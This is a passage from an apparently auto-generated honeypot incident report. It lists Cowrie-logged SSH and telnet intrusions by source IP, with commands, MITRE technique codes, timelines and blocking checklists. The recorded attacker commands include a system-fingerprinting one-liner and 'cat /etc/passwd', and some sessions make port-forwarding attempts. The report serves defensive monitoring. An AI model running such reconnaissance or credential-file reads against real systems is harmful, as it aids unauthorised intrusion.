| **First Seen** | 2026-08-19 12:10 |
| **Last Seen** | 2026-08-19 12:10 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:10:11` | `cowrie.session.connect` |
| `2026-08-19 12:10:11` | `cowrie.client.version` |
| `2026-08-19 12:10:11` | `cowrie.client.kex` |
| `2026-08-19 12:10:14` | `cowrie.login.success` |
| `2026-08-19 12:10:15` | `cowrie.session.params` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.success` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:15` | `cowrie.command.input` |
| `2026-08-19 12:10:16` | `cowrie.log.closed` |
| `2026-08-19 12:10:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e8e9a4d7065

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:12 |
| **Last Seen** | 2026-08-19 12:12 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:12:16` | `cowrie.session.connect` |
| `2026-08-19 12:12:16` | `cowrie.client.version` |
| `2026-08-19 12:12:16` | `cowrie.client.kex` |
| `2026-08-19 12:12:18` | `cowrie.login.success` |
| `2026-08-19 12:12:20` | `cowrie.session.params` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.success` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:20` | `cowrie.command.input` |
| `2026-08-19 12:12:22` | `cowrie.log.closed` |
| `2026-08-19 12:12:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-107801ddc084

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:12 |
| **Last Seen** | 2026-08-19 12:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:12:16` | `cowrie.session.connect` |
| `2026-08-19 12:12:16` | `cowrie.client.version` |
| `2026-08-19 12:12:16` | `cowrie.client.kex` |
| `2026-08-19 12:12:16` | `cowrie.login.success` |
| `2026-08-19 12:12:17` | `cowrie.session.params` |
| `2026-08-19 12:12:17` | `cowrie.command.input` |
| `2026-08-19 12:12:17` | `cowrie.log.closed` |
| `2026-08-19 12:12:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5e334a781ff

| Field | Detail |
|---|---|
| **Source IP** | `110.173.190[.]221` |
| **First Seen** | 2026-08-19 12:16 |
| **Last Seen** | 2026-08-19 12:16 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:16:14` | `cowrie.session.connect` |
| `2026-08-19 12:16:16` | `cowrie.client.version` |
| `2026-08-19 12:16:16` | `cowrie.client.kex` |
| `2026-08-19 12:16:22` | `cowrie.login.success` |
| `2026-08-19 12:16:26` | `cowrie.session.params` |
| `2026-08-19 12:16:26` | `cowrie.command.input` |
| `2026-08-19 12:16:27` | `cowrie.log.closed` |
| `2026-08-19 12:16:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `110.173.190[.]221` to AbuseIPDB if not already reported
- [ ] Block `110.173.190[.]221` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5bd8107c3c8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:16 |
| **Last Seen** | 2026-08-19 12:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:16:18` | `cowrie.session.connect` |
| `2026-08-19 12:16:18` | `cowrie.client.version` |
| `2026-08-19 12:16:18` | `cowrie.client.kex` |
| `2026-08-19 12:16:20` | `cowrie.login.success` |
| `2026-08-19 12:16:22` | `cowrie.session.params` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.success` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.command.input` |
| `2026-08-19 12:16:22` | `cowrie.log.closed` |
| `2026-08-19 12:16:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ce8d5eb6e0d

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:18 |
| **Last Seen** | 2026-08-19 12:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:18:12` | `cowrie.session.connect` |
| `2026-08-19 12:18:12` | `cowrie.client.version` |
| `2026-08-19 12:18:12` | `cowrie.client.kex` |
| `2026-08-19 12:18:13` | `cowrie.login.success` |
| `2026-08-19 12:18:13` | `cowrie.session.params` |
| `2026-08-19 12:18:13` | `cowrie.command.input` |
| `2026-08-19 12:18:14` | `cowrie.log.closed` |
| `2026-08-19 12:18:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fbd6d9b6410

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:18 |
| **Last Seen** | 2026-08-19 12:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:18:19` | `cowrie.session.connect` |
| `2026-08-19 12:18:19` | `cowrie.client.version` |
| `2026-08-19 12:18:19` | `cowrie.client.kex` |
| `2026-08-19 12:18:21` | `cowrie.login.success` |
| `2026-08-19 12:18:22` | `cowrie.session.params` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.success` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:22` | `cowrie.command.input` |
| `2026-08-19 12:18:23` | `cowrie.log.closed` |
| `2026-08-19 12:18:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3905bf36d77c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:20 |
| **Last Seen** | 2026-08-19 12:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:20:37` | `cowrie.session.connect` |
| `2026-08-19 12:20:37` | `cowrie.client.version` |
| `2026-08-19 12:20:37` | `cowrie.client.kex` |
| `2026-08-19 12:20:39` | `cowrie.login.success` |
| `2026-08-19 12:20:41` | `cowrie.session.params` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.success` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.log.closed` |
| `2026-08-19 12:20:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab0cef433719

| Field | Detail |
|---|---|
| **Source IP** | `209.99.190[.]174` |
| **First Seen** | 2026-08-19 12:20 |
| **Last Seen** | 2026-08-19 12:21 |
| **Session Duration** | 73s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1021.004 · T1059.004 · T1078 · T1083 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:20:38` | `cowrie.session.connect` |
| `2026-08-19 12:20:39` | `cowrie.telnet.option` |
| `2026-08-19 12:20:40` | `cowrie.telnet.option` |
| `2026-08-19 12:20:40` | `cowrie.login.success` |
| `2026-08-19 12:20:40` | `cowrie.session.params` |
| `2026-08-19 12:20:41` | `cowrie.telnet.option` |
| `2026-08-19 12:20:41` | `cowrie.telnet.option` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:41` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.failed` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:20:42` | `cowrie.command.input` |
| `2026-08-19 12:21:52` | `cowrie.log.closed` |
| `2026-08-19 12:21:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.190[.]174` to AbuseIPDB if not already reported
- [ ] Block `209.99.190[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524c615fdc84

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:22 |
| **Last Seen** | 2026-08-19 12:22 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:22:43` | `cowrie.session.connect` |
| `2026-08-19 12:22:43` | `cowrie.client.version` |
| `2026-08-19 12:22:43` | `cowrie.client.kex` |
| `2026-08-19 12:22:45` | `cowrie.login.success` |
| `2026-08-19 12:22:46` | `cowrie.session.params` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.success` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:46` | `cowrie.command.input` |
| `2026-08-19 12:22:47` | `cowrie.log.closed` |
| `2026-08-19 12:22:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0f9c0fceb7a

| Field | Detail |
|---|---|
| **Source IP** | `85.158.145[.]129` |
| **First Seen** | 2026-08-19 12:24 |
| **Last Seen** | 2026-08-19 12:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -a` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:24:08` | `cowrie.session.connect` |
| `2026-08-19 12:24:08` | `cowrie.client.version` |
| `2026-08-19 12:24:08` | `cowrie.client.kex` |
| `2026-08-19 12:24:09` | `cowrie.login.success` |
| `2026-08-19 12:24:09` | `cowrie.session.params` |
| `2026-08-19 12:24:09` | `cowrie.command.input` |
| `2026-08-19 12:24:09` | `cowrie.log.closed` |
| `2026-08-19 12:24:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.158.145[.]129` to AbuseIPDB if not already reported
- [ ] Block `85.158.145[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e917c7ff3cac

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-08-19 12:24 |
| **Last Seen** | 2026-08-19 12:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:24:49` | `cowrie.session.connect` |
| `2026-08-19 12:24:50` | `cowrie.client.version` |
| `2026-08-19 12:24:50` | `cowrie.client.kex` |
| `2026-08-19 12:24:52` | `cowrie.login.success` |
| `2026-08-19 12:24:52` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acf40117e5d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:24 |
| **Last Seen** | 2026-08-19 12:24 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:24:50` | `cowrie.session.connect` |
| `2026-08-19 12:24:50` | `cowrie.client.version` |
| `2026-08-19 12:24:50` | `cowrie.client.kex` |
| `2026-08-19 12:24:52` | `cowrie.login.success` |
| `2026-08-19 12:24:54` | `cowrie.session.params` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.success` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:54` | `cowrie.command.input` |
| `2026-08-19 12:24:55` | `cowrie.log.closed` |
| `2026-08-19 12:24:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a35d9202966

| Field | Detail |
|---|---|
| **Source IP** | `219.144.16[.]16` |
| **First Seen** | 2026-08-19 12:24 |
| **Last Seen** | 2026-08-19 12:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:24:58` | `cowrie.session.connect` |
| `2026-08-19 12:24:59` | `cowrie.client.version` |
| `2026-08-19 12:24:59` | `cowrie.client.kex` |
| `2026-08-19 12:25:03` | `cowrie.login.success` |
| `2026-08-19 12:25:05` | `cowrie.direct-tcpip.request` |
| `2026-08-19 12:25:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.144.16[.]16` to AbuseIPDB if not already reported
- [ ] Block `219.144.16[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9363053d62d9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-08-19 12:26 |
| **Last Seen** | 2026-08-19 12:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-19 12:26:57` | `cowrie.session.connect` |
| `2026-08-19 12:26:58` | `cowrie.client.version` |
| `2026-08-19 12:26:58` | `cowrie.client.kex` |
| `2026-08-19 12:26:59` | `cowrie.login.success` |
| `2026-08-19 12:27:00` | `cowrie.session.params` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.success` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:00` | `cowrie.command.input` |
| `2026-08-19 12:27:01` | `cowrie.log.closed` |
| `2026-08-19 12:27:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e33949caf5f

| Field | Detail |
|---|---|
| **Source IP** | `96.78.175[.]36` |
| **First Seen** | 2026-08-19 12:27 |
| **Last Seen** | 2026-08-19 12:27 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
